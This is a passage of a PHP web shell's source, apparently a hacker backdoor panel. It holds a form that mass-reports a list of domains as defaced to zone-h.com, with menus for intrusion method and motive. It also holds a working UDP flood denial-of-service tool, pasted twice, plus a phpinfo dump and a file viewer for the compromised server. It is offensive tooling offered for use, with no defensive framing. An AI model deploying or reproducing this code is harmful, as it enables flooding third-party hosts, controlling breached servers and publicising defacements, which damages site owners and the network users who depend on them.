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%3D" style="width: 261px; height: 67px;" /></p>
<center><span style="font-size:1.6em;"> .: Notifier :. </span></center><center><form action="" method="post"><input class="inputz" type="text" name="defacer" size="67" value="Newbie3viLc063s" /><br> <select class="inputz" name="hackmode">
<option>------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(0, 0, 0);" value="1">known vulnerability (i.e. unpatched system)</option> 
<option style="background-color: rgb(0, 0, 0);" value="2" >undisclosed (new) vulnerability</option> 
<option style="background-color: rgb(0, 0, 0);" value="3" >configuration / admin. mistake</option> 
<option style="background-color: rgb(0, 0, 0);" value="4" >brute force attack</option> 
<option style="background-color: rgb(0, 0, 0);" value="5" >social engineering</option> 
<option style="background-color: rgb(0, 0, 0);" value="6" >Web Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="7" >Web Server external module intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="8" >Mail Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="9" >FTP Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="10" >SSH Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="11" >Telnet Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="12" >RPC Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="13" >Shares misconfiguration</option> 
<option style="background-color: rgb(0, 0, 0);" value="14" >Other Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="15" >SQL Injection</option> 
<option style="background-color: rgb(0, 0, 0);" value="16" >URL Poisoning</option> 
<option style="background-color: rgb(0, 0, 0);" value="17" >File Inclusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="18" >Other Web Application bug</option> 
<option style="background-color: rgb(0, 0, 0);" value="19" >Remote administrative panel access bruteforcing</option> 
<option style="background-color: rgb(0, 0, 0);" value="20" >Remote administrative panel access password guessing</option> 
<option style="background-color: rgb(0, 0, 0);" value="21" >Remote administrative panel access social engineering</option> 
<option style="background-color: rgb(0, 0, 0);" value="22" >Attack against administrator(password stealing/sniffing)</option> 
<option style="background-color: rgb(0, 0, 0);" value="23" >Access credentials through Man In the Middle attack</option> 
<option style="background-color: rgb(0, 0, 0);" value="24" >Remote service password guessing</option> 
<option style="background-color: rgb(0, 0, 0);" value="25" >Remote service password bruteforce</option> 
<option style="background-color: rgb(0, 0, 0);" value="26" >Rerouting after attacking the Firewall</option> 
<option style="background-color: rgb(0, 0, 0);" value="27" >Rerouting after attacking the Router</option> 
<option style="background-color: rgb(0, 0, 0);" value="28" >DNS attack through social engineering</option> 

<option style="background-color: rgb(0, 0, 0);" value="29" >DNS attack through cache poisoning</option> 
<option style="background-color: rgb(0, 0, 0);" value="30" >Not available</option> 
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select> <br>

<select class="inputz" name="reason">
<option >------------------------------------SELECT-------------------------------------</option> 
<option style="background-color: rgb(0, 0, 0);" value="1" >Heh...just for fun!</option> 
<option style="background-color: rgb(0, 0, 0);" value="2" >Revenge against that website</option> 
<option style="background-color: rgb(0, 0, 0);" value="3" >Political reasons</option> 
<option style="background-color: rgb(0, 0, 0);" value="4" >As a challenge</option> 
<option style="background-color: rgb(0, 0, 0);" value="5" >I just want to be the best defacer</option> 
<option style="background-color: rgb(0, 0, 0);" value="6" >Patriotism</option> 
<option style="background-color: rgb(0, 0, 0);" value="7" >Not available</option> 
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option> 
</select> <br>
<textarea class="inputz" name="domain" cols="90" rows="20">List Of Domains, 20 Rows.</textarea><br>
<input class="inputz" type="submit" value=" Send Now !! " name="SendNowToZoneH"/> 
</form>'; ?> 
<? 
    echo "</form></center>";?> 
<? 
function ZoneH($url, $hacker, $hackmode,$reson, $site ) 
{ 
    $k = curl_init(); 
    curl_setopt($k, CURLOPT_URL, $url); 
    curl_setopt($k,CURLOPT_POST,true); 
    curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson); 
    curl_setopt($k,CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($k, CURLOPT_RETURNTRANSFER, true); 
    $kubra = curl_exec($k); 
    curl_close($k); 
    return $kubra; 
} 
{ 
                ob_start(); 
                $sub = @get_loaded_extensions(); 
                if(!in_array("curl", $sub)) 
                { 
                    die('<center><b>[-] Curl Is Not Supported !![-]</b></center>'); 
                } 
             
                $hacker = $_POST['defacer']; 
                $method = $_POST['hackmode']; 
                $neden = $_POST['reason']; 
                $site = $_POST['domain']; 
                 
                if (empty($hacker)) 
                { 
                    die ("<center><b>[+] YOU MUST FILL THE ATTACKER NAME [+]</b></center>"); 
                } 
                elseif($method == "--------SELECT--------")  
                { 
                    die("<center><b>[+] YOU MUST SELECT THE METHOD [+]</b></center>"); 
                } 
                elseif($neden == "--------SELECT--------")  
                { 
                    die("<center><b>[+] YOU MUST SELECT THE REASON [+]</b></center>"); 
                } 
                elseif(empty($site))  
                { 
                    die("<center><b>[+] YOU MUST INTER THE SITES LIST [+]</b></center>"); 
                } 
                $i = 0; 
                $sites = explode("\n", $site); 
                while($i < count($sites))  
                { 
                    if(substr($sites[$i], 0, 4) != "http")  
                    { 
                        $sites[$i] = "http://".$sites[$i]; 
                    } 
                    ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]); 
                    echo "Domain : ".$sites[$i]." Defaced Last Years !"; 
                    ++$i; 
                } 
                echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]"; 
            } 
?>
<?php }

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
	<?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Attack !" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
	<?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Go" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo'))
	{ 
	@ob_start(); 
	@eval("phpinfo();"); 
	$buff = @ob_get_contents(); 
	@ob_end_clean(); 
	$awal = strpos($buff,"<body>")+6; 
	$akhir = strpos($buff,"</body>"); 
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>"; 
	} 

elseif(isset($_GET['view']) && ($_GET['view'] != ""))
	{ 
	if(is_file($_GET['view']))
		{ 
		if(!isset($file)) $file = magicboom($_GET['view']); 
		if(!$win && $posix)
			{ 
			$name=@posix_getpwuid(@fileowner($file)); 
			$group=@posix_getgrgid(@filegroup($file)); 
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
			} 
		else { $owner = $user; } 
		$filn = basename($file); 
		echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> 
			<tr>
				<td>Filename</td>
				<td>
					<span id=\"".clearspace($filn)."_link\">".$file."</span> 
					<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" /> 
					</form> 
				</td>
			</tr> 
			<tr>
				<td>Size</td>
				<td>".ukuran($file)."</td>
			</tr> 
			<tr>
				<td>Permission</td>
				<td>".get_perms($file)."</td>
			</tr> 
			<tr>
				<td>Owner</td>
				<td>".$owner."</td>
			</tr> 
			<tr>
				<td>Create time</td>
				<td>".date("d-M-Y H:i",@filectime($file))."</td>
			</tr> 
			<tr>
				<td>Last modified</td>
				<td>".date("d-M-Y H:i",@filemtime($file))."</td>
			</tr> 
			<tr>
				<td>Last accessed</td>
